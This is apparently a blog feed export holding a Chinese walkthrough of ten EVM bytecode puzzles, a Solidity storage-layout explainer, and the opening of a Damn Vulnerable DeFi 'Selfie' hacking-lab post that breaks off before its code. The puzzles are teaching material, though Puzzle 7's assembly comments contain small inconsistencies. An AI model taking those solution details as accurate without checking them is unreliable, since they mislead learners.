      <link href="/2024/01/08/Opcode-EVM-PUZZLES/"/>
      <url>/2024/01/08/Opcode-EVM-PUZZLES/</url>
      
        <content type="html"><![CDATA[<h2 id="Puzzles1"><a href="#Puzzles1" class="headerlink" title="Puzzles1"></a>Puzzles1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 1 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      56      JUMP</span><br><span class="line">02      FD      REVERT</span><br><span class="line">03      FD      REVERT</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      FD      REVERT</span><br><span class="line">07      FD      REVERT</span><br><span class="line">08      5B      JUMPDEST</span><br><span class="line">09      00      STOP</span><br><span class="line"></span><br><span class="line">? Enter the value to send: (0) </span><br></pre></td></tr></table></figure><blockquote><p>考察JUMP</p></blockquote><p><strong>CALLVALUE</strong></p><ul><li>操作码：<code>0x34</code></li><li>gas消耗: 2</li><li>功能：将发送给合约的ether的数量（以wei为单位）压入堆栈。</li><li>使用场景：当合约需要知道有多少以太币被发送时使用。</li></ul><p><strong>JUMP</strong><br><code>JUMP</code>指令用于无条件跳转到一个新的程序计数器位置。它从堆栈中弹出一个元素（也就是栈顶），将这个元素设定为新的程序计数器（<code>pc</code>）的值。操作码是<code>0x56</code>，gas消耗为8。</p><p><strong>JUMPDEST</strong></p><p><code>JUMPDEST</code>指令标记一个有效的跳转目标位置，不然无法使用<code>JUMP</code>和<code>JUMPI</code>进行跳转。它的操作码是<code>0x5b</code>，<code>gas</code>消耗为1。<br><code>JUMP</code> 和 <code>JUMPI</code> 指令只能跳转到被标记为 <code>JUMPDEST</code> 的位置。这个机制是为了确保代码的安全性，防止通过跳转到随机或不合适的代码位置来执行潜在的恶意操作。</p><p>所以输入<code>8</code>,使<code>CALLVALUE=8</code>，通过挑战</p><h2 id="Puzzles2"><a href="#Puzzles2" class="headerlink" title="Puzzles2"></a>Puzzles2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 2 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      38      CODESIZE</span><br><span class="line">02      03      SUB</span><br><span class="line">03      56      JUMP</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      5B      JUMPDEST</span><br><span class="line">07      00      STOP</span><br><span class="line">08      FD      REVERT</span><br><span class="line">09      FD      REVERT</span><br></pre></td></tr></table></figure><p><strong>CODESIZE</strong></p><ul><li>操作码：<code>0x38</code></li><li>gas消耗： 2</li><li>功能：获取当前合约代码的字节长度，然后压入堆栈。</li><li>使用场景：当合约需要访问自己的字节码时使用。</li></ul><p>在这里就是10</p><p><strong>SUB</strong><br>算数指令<code>SUB</code>指令从堆栈顶部弹出两个元素，然后计算第一个元素减去第二个元素，最后将结果推入堆栈。这个指令的操作码是<code>0x03</code>，gas消耗为<code>3</code>。</p><p>所以目标是 <code>CODESIZE - CALLVALUE = 6</code></p><p>所以我们使得 <code>CALLVALUE = 4</code> ，就可以通过挑战</p><h2 id="Puzzles3"><a href="#Puzzles3" class="headerlink" title="Puzzles3"></a>Puzzles3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 3 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      36      CALLDATASIZE</span><br><span class="line">01      56      JUMP</span><br><span class="line">02      FD      REVERT</span><br><span class="line">03      FD      REVERT</span><br><span class="line">04      5B      JUMPDEST</span><br><span class="line">05      00      STOP</span><br></pre></td></tr></table></figure><p><strong>CALLDATASIZE</strong></p><ul><li>操作码：<code>0x36</code></li><li>gas消耗：2</li><li>功能：获取交易或合约调用的<code>data</code>字段的字节长度，并压入堆栈。</li><li>使用场景：在读取数据之前检查大小。</li></ul><p>所以我们传入任意四位长度的data就可以了，<code>CALLDATASIZE = 0x00000000</code></p><h2 id="Puzzles4"><a href="#Puzzles4" class="headerlink" title="Puzzles4"></a>Puzzles4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 4 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      38      CODESIZE</span><br><span class="line">02      18      XOR</span><br><span class="line">03      56      JUMP</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      FD      REVERT</span><br><span class="line">07      FD      REVERT</span><br><span class="line">08      FD      REVERT</span><br><span class="line">09      FD      REVERT</span><br><span class="line">0A      5B      JUMPDEST</span><br><span class="line">0B      00      STOP</span><br></pre></td></tr></table></figure><p><strong>XOR</strong><br><code>XOR</code>指令与<code>AND</code>和<code>OR</code>指令类似，但执行的是异或运算。操作码是<code>0x18</code>，gas 消耗为<code>3</code>。</p><p>也就是我们使得<code>CALLVALUE xor 0x0c = a</code> 也就是<code>CALLVALUE xor 1100 = 1010</code>，<code>CALLVALUE = 0110 = 6</code></p><h2 id="Puzzles5"><a href="#Puzzles5" class="headerlink" title="Puzzles5"></a>Puzzles5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 5 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      34          CALLVALUE</span><br><span class="line">01      80          DUP1</span><br><span class="line">02      02          MUL</span><br><span class="line">03      610100      PUSH2 0100</span><br><span class="line">06      14          EQ</span><br><span class="line">07      600C        PUSH1 0C</span><br><span class="line">09      57          JUMPI</span><br><span class="line">0A      FD          REVERT</span><br><span class="line">0B      FD          REVERT</span><br><span class="line">0C      5B          JUMPDEST</span><br><span class="line">0D      00          STOP</span><br><span class="line">0E      FD          REVERT</span><br><span class="line">0F      FD          REVERT</span><br></pre></td></tr></table></figure><p><strong>DUP1</strong><br>在EVM中，<code>DUP</code>是一系列的指令，总共有16个，从<code>DUP1</code>到<code>DUP16</code>，操作码范围为<code>0x80</code>到<code>0x8F</code>，gas消耗均为3。这些指令用于复制（Duplicate）堆栈上的指定元素（根据指令的序号）到堆栈顶部。例如，<code>DUP1</code>复制栈顶元素，<code>DUP2</code>复制距离栈顶的第二个元素，以此类推。</p><p><strong>MUL</strong><br>MUL<code>指令和</code>ADD<code>类似，但是它将堆栈的顶部两个元素相乘。操作码是</code>0x02<code>，gas消耗为</code>5&#96;。</p><p><strong>EQ</strong><br>EQ<code>指令从堆栈中弹出两个元素，如果两个元素相等，那么将</code>1<code>推入堆栈，否则将</code>0<code>推入堆栈。该指令的操作码是</code>0x14<code>，gas消耗为</code>3&#96;。</p><p><strong>JUMPI</strong><br><code>JUMPI</code>指令用于条件跳转，它从堆栈中弹出两个元素，如果第二个元素（条件，<code>condition</code>）不为0，那么将第一个元素（目标，<code>destination</code>）设定为新的<code>pc</code>的值。操作码是<code>0x57</code>，gas消耗为10。</p><p>所以我们要使<code>CALLVALUE * CALLVALUE = 0x100</code> ，所以我们可以得到<code>CALLVALUE = 16</code></p><h2 id="Puzzles6"><a href="#Puzzles6" class="headerlink" title="Puzzles6"></a>Puzzles6</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 6 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      6000      PUSH1 00</span><br><span class="line">02      35        CALLDATALOAD</span><br><span class="line">03      56        JUMP</span><br><span class="line">04      FD        REVERT</span><br><span class="line">05      FD        REVERT</span><br><span class="line">06      FD        REVERT</span><br><span class="line">07      FD        REVERT</span><br><span class="line">08      FD        REVERT</span><br><span class="line">09      FD        REVERT</span><br><span class="line">0A      5B        JUMPDEST</span><br><span class="line">0B      00        STOP</span><br></pre></td></tr></table></figure><p><strong>CALLDATALOAD</strong></p><ul><li>操作码：<code>0x35</code></li><li>gas消耗: 3</li><li>功能：从交易或合约调用的<code>data</code>字段加载数据。它从堆栈中弹出calldata的偏移量（<code>offset</code>），然后从calldata的<code>offset</code>位置读取32字节的数据并压入堆栈。如果<code>calldata</code>剩余不足32字节，则补0。</li><li>使用场景：读取传入的数据。</li></ul><p>因为<code>JUMPDEST</code>在<code>0A</code>，所以传入：<code>0x000000000000000000000000000000000000000000000000000000000000000a</code></p><h2 id="Puzzles7"><a href="#Puzzles7" class="headerlink" title="Puzzles7"></a>Puzzles7</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 7 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6000      PUSH1 00</span><br><span class="line">03      80        DUP1  //=CALLDATASIZE</span><br><span class="line">04      37        CALLDATACOPY</span><br><span class="line">05      36        CALLDATASIZE</span><br><span class="line">06      6000      PUSH1 00</span><br><span class="line">08      6000      PUSH1 00</span><br><span class="line">0A      F0        CREATE</span><br><span class="line">0B      3B        EXTCODESIZE</span><br><span class="line">0C      6001      PUSH1 01</span><br><span class="line">0E      14        EQ</span><br><span class="line">0F      6013      PUSH1 13</span><br><span class="line">11      57        JUMPI</span><br><span class="line">12      FD        REVERT</span><br><span class="line">13      5B        JUMPDEST</span><br><span class="line">14      00        STOP</span><br></pre></td></tr></table></figure><p><strong>CALLDATACOPY</strong></p><ul><li>操作码：<code>0x37</code></li><li>gas消耗：3 + 3 * 数据长度 + 内存扩展成本</li><li>功能：将<code>data</code>中的数据复制到内存中。它会从堆栈中弹出3个参数(mem_offset, calldata_offset, length)，分别对应写到内存的偏移量，读取calldata的偏移量和长度。</li><li>使用场景：将输入数据复制到内存。</li></ul><p><strong>CREATE</strong><br>在EVM中，当一个合约想要创建一个新的合约时，会使用<code>CREATE</code>指令。它的简化流程：</p><ol><li>从堆栈中弹出<code>value</code>（向新合约发送的ETH）、<code>mem_offset</code>和<code>length</code>（新合约的<code>initcode</code>在内存中的初始位置和长度）。</li><li>计算新合约的地址，计算方法为: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address = keccak256(rlp([sender_address,sender_nonce]))[<span class="number">12</span>:]</span><br></pre></td></tr></table></figure></li><li>更新ETH余额。</li><li>初始化新的EVM上下文<code>evm_create</code>，用于执行<code>initcode</code>。</li><li>在<code>evm_create</code>中执行<code>initcode</code>。</li><li>如果执行成功，则更新创建的账户状态：更新<code>balance</code>，将<code>nonce</code>初始化为<code>0</code>，将<code>code</code>字段设为<code>evm_create</code>的返回数据，将<code>storage</code>字段设置为<code>evm_create</code>的<code>storage</code>。</li><li>如果成功，则将新合约地址推入堆栈；若失败，将<code>0</code>推入堆栈。</li></ol><p>所以根据题目，我们要构造一个<code>runtimecode = 1</code> 的合约，这样才能通过<code>0E</code>的<code>EQ</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">## 把01放进栈，任意长度为1字节的内容即可</span><br><span class="line">PUSH1 01       </span><br><span class="line">PUSH1 00   </span><br><span class="line">## 把ff存入memory，因为return会才能够内存中返回</span><br><span class="line">MSTORE        </span><br><span class="line">## 将01从内存返回作为runtimecode，压入return需要的另外两个参数。</span><br><span class="line">PUSH1 31</span><br><span class="line">PUSH1 1</span><br><span class="line">RETURN </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以构造出<code>CALLDATA = 60016000526001601ff3</code></p><h2 id="Puzzles8"><a href="#Puzzles8" class="headerlink" title="Puzzles8"></a>Puzzles8</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 8 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6000      PUSH1 00</span><br><span class="line">03      80        DUP1</span><br><span class="line">04      37        CALLDATACOPY</span><br><span class="line">05      36        CALLDATASIZE</span><br><span class="line">06      6000      PUSH1 00</span><br><span class="line">08      6000      PUSH1 00</span><br><span class="line">0A      F0        CREATE</span><br><span class="line">0B      6000      PUSH1 00</span><br><span class="line">0D      80        DUP1</span><br><span class="line">0E      80        DUP1</span><br><span class="line">0F      80        DUP1</span><br><span class="line">10      80        DUP1</span><br><span class="line">11      94        SWAP5</span><br><span class="line">12      5A        GAS</span><br><span class="line">13      F1        CALL</span><br><span class="line">14      6000      PUSH1 00</span><br><span class="line">16      14        EQ</span><br><span class="line">17      601B      PUSH1 1B</span><br><span class="line">19      57        JUMPI</span><br><span class="line">1A      FD        REVERT</span><br><span class="line">1B      5B        JUMPDEST</span><br><span class="line">1C      00        STOP</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>想要执行<code>JUMPDEST</code> 先要让<code>CALL = 00</code>，也就是CALL调用CREATE的新合约要失败，才能通过EQ。<br>上一题构造了一个<code>0x60016000526001601ff3</code>,但是01时ADD，但是没有参数所以执行会失败，所以会也可以通过这题。</p><h2 id="Puzzles9"><a href="#Puzzles9" class="headerlink" title="Puzzles9"></a>Puzzles9</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 9 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6003      PUSH1 03</span><br><span class="line">03      10        LT</span><br><span class="line">04      6009      PUSH1 09</span><br><span class="line">06      57        JUMPI</span><br><span class="line">07      FD        REVERT</span><br><span class="line">08      FD        REVERT</span><br><span class="line">09      5B        JUMPDEST</span><br><span class="line">0A      34        CALLVALUE</span><br><span class="line">0B      36        CALLDATASIZE</span><br><span class="line">0C      02        MUL</span><br><span class="line">0D      6008      PUSH1 08</span><br><span class="line">0F      14        EQ</span><br><span class="line">10      6014      PUSH1 14</span><br><span class="line">12      57        JUMPI</span><br><span class="line">13      FD        REVERT</span><br><span class="line">14      5B        JUMPDEST</span><br><span class="line">15      00        STOP</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输入的<code>CALLDATASIZE</code>需要<code>&gt;3</code>，同时，<code>CALLDATASIZE*CALLVALUE = 8</code> 。<br>所以我们传入<code>CALLDATASIZE = 0x00000000</code>，<code>CALLVALUE = 2</code>即可</p><h2 id="Puzzles10"><a href="#Puzzles10" class="headerlink" title="Puzzles10"></a>Puzzles10</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#############</span><br><span class="line"># Puzzle 10 #</span><br><span class="line">#############</span><br><span class="line"></span><br><span class="line">00      38          CODESIZE</span><br><span class="line">01      34          CALLVALUE</span><br><span class="line">02      90          SWAP1</span><br><span class="line">03      11          GT</span><br><span class="line">04      6008        PUSH1 08</span><br><span class="line">06      57          JUMPI</span><br><span class="line">07      FD          REVERT</span><br><span class="line">08      5B          JUMPDEST</span><br><span class="line">09      36          CALLDATASIZE</span><br><span class="line">0A      610003      PUSH2 0003</span><br><span class="line">0D      90          SWAP1</span><br><span class="line">0E      06          MOD</span><br><span class="line">0F      15          ISZERO</span><br><span class="line">10      34          CALLVALUE</span><br><span class="line">11      600A        PUSH1 0A</span><br><span class="line">13      01          ADD</span><br><span class="line">14      57          JUMPI</span><br><span class="line">15      FD          REVERT</span><br><span class="line">16      FD          REVERT</span><br><span class="line">17      FD          REVERT</span><br><span class="line">18      FD          REVERT</span><br><span class="line">19      5B          JUMPDEST</span><br><span class="line">1A      00          STOP</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先<code>CALLVALUE</code>最大不能超过<code>CODESIZE</code>也就是<code>27</code>，其次<code>CALLDATASIZE mod 3 = 0 </code>，最后要求<code>CALLVALUE+0A = 0x19</code>.<br>所以我们可以取<code>CALLDATASIZE = 0x000000</code>,<code>CALLVALUE = 15</code></p>]]></content>
      
      
      <categories>
          
          <category> Opcodes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> solidity </tag>
            
            <tag> evm-puzzles </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>About_Uniswap</title>
      <link href="/2024/01/05/About-Uniswap/"/>
      <url>/2024/01/05/About-Uniswap/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>About_Storage_layout</title>
      <link href="/2024/01/02/About-Storage-layout/"/>
      <url>/2024/01/02/About-Storage-layout/</url>
      
        <content type="html"><![CDATA[<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><hr><blockquote><p>Variables are declared as either storage, memory or calldata to explicity specify the location of the data     –solidity-by-example</p></blockquote><ul><li><code>storage</code> - variable is a state variable (store on blockchain))</li><li><code>memory</code> - variable is in memory and it exists while a function is being called</li><li><code>calldata</code> - special data location that contains function arguments</li></ul><h2 id="Detail"><a href="#Detail" class="headerlink" title="Detail"></a>Detail</h2><hr><p>State variables of contracts are stored in storage in a compact way. Sometimes multiple values may use the same storage slot. Except for dynamically-sized arrays and mappings , data is stored contiguously item after item starting with the first state variable ,start from slot 0.</p><p>According to the following rules:</p><ul><li>The first item in a storage slot is stored lower-order aligned.</li><li>Value types use only as many bytes as are necessary to store them.</li><li>If a value type does not fit the remaining part of a storage slot, it is stored in the next storage slot.</li><li>Structs and array data always start a new slot and their items are packed tightly according to these rules.</li><li>Items following struct or array data always start a new storage slot.</li></ul><h2 id="Mapping-and-Dynamic-Arrays"><a href="#Mapping-and-Dynamic-Arrays" class="headerlink" title="Mapping and Dynamic Arrays"></a>Mapping and Dynamic Arrays</h2><hr><p>Due to their unpredictable size, mappings and dynamically-sized array types cannot be stored “in between” the state variables preceding and following them. Instead, they are considered to occupy only 32 bytes with regards to the rules above and the elements they contain are stored starting at a different storage slot that is computed using a Keccak-256 hash.</p><h3 id="Dynamic-Variables"><a href="#Dynamic-Variables" class="headerlink" title="Dynamic Variables"></a>Dynamic Variables</h3><p>The object itself does take up a storage slot, but it doesn’t contain the whole array. Instead, the storage slot contains the length of the array.</p><p>If we add a new element to the array by calling <code>Array.push(123)</code>, the array’s length and the new element are stored at separate locations determined by the hash function</p><h3 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h3><p>For mapping it’s has a slot , but it is empty it’s blank</p><h2 id="Temporary-Variables-Function-Scope"><a href="#Temporary-Variables-Function-Scope" class="headerlink" title="Temporary Variables: Function Scope"></a>Temporary Variables: Function Scope</h2><hr><p>For variables that are declared inside a function, their existence is ephemeral and scoped merely to the span of that function. These variables do not persist inside the contract and are not stored in <code>Storage</code>. Instead, they’re stashed in a different memory data structure, which deletes them as soon as the function has finished execution.<br>e.g:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract Contract&#123;</span><br><span class="line">    function test(uint val) public &#123;</span><br><span class="line">        uint nVar = val + 5;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>nVar</code> only exists for the duration of <code>test()</code>.</p><h2 id="Memory-Keyword-Necessary-for-Strings"><a href="#Memory-Keyword-Necessary-for-Strings" class="headerlink" title="Memory Keyword: Necessary for Strings"></a>Memory Keyword: Necessary for Strings</h2><p>Finally, the <code>memory</code> keyword. Primarily used with strings, <code>memory</code> is needed because strings are dynamically sized arrays. By using this keyword, we tell Solidity that string operations are to be performed not in <code>Storage</code>, but in a separate memory location.</p><p>Solidity needs this explicit instruction because arrays and mappings require more space, hence the need to ensure that space is allocated in the appropriate data structure.<br>Here’s a code snippet using <code>memory</code> keyword with string:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract exampleContract&#123;</span><br><span class="line">    function getString() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;this is a string!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Constant-immutable"><a href="#Constant-immutable" class="headerlink" title="Constant &amp; immutable"></a>Constant &amp; immutable</h2><hr><p>The Solidity dont store constant or immutable variables in storage instead the vaues will replaced in every occurrence of these variables with their assigned value in the contract’s bytecode.</p><h2 id="Each-Variables-size-Example"><a href="#Each-Variables-size-Example" class="headerlink" title="Each Variables size(Example):"></a>Each Variables size(Example):</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Contract MyContract &#123;</span><br><span class="line">  uint256 zero;                          // in slot 0</span><br><span class="line">  mapping(address =&gt; uint256) one;    // in slot 1</span><br><span class="line">  address two;                          // in slot 2 </span><br><span class="line">  bool a;                              // in slot 3 - 1 byte</span><br><span class="line">  uint8 b;                             // in slot 3 - 1 byte </span><br><span class="line">  bytes16 c;                           // in slot 3 - 16 bytes</span><br><span class="line">  address immutable noWhere;           // Do not stored on storage</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Use-Foundry"><a href="#Use-Foundry" class="headerlink" title="Use Foundry"></a>Use Foundry</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge inspect contract_name storage</span><br></pre></td></tr></table></figure><p><img src="/../images/storageimg.png"></p><h2 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h2><p><a href="https://docs.soliditylang.org/en/v0.8.20/internals/layout_in_storage.html">https://docs.soliditylang.org/en/v0.8.20/internals/layout_in_storage.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Solidity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Solidity </tag>
            
            <tag> Basic </tag>
            
            <tag> Storage </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-10</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-10/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-10/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-9</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-9/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-9/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-8</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-8/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-8/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-7</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-7/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-7/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-6</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-6/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-6/</url>
      
        <content type="html"><![CDATA[<h1 id="Selfie"><a href="#Selfie" class="headerlink" title="Selfie"></a>Selfie</h1><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.</span><br><span class="line"></span><br><span class="line">What could go wrong, right ?</span><br><span class="line"></span><br><span class="line">You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.</span><br></pre></td></tr></table></figure><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><hr><p><code>SelfiePool.sol</code>:</p><details><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 